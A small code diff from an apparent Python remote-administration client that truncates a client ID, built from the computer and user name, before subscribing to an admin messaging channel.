@@ -67,7 +67,7 @@ def handle_connection_to_server(connection):
         client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].split('-')[-1]
                             .split('@')[0]) + 1) + f'@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
     except IndexError:
-        client_id = f'0@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
+        client_id = f'0@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'[:156]
     channel = receiver.subscribe(f'admin-{client_id}')
     print("Client id: " + client_id)
     channel.bind('connection_from_admin', lambda _: print("Connection from admin"))
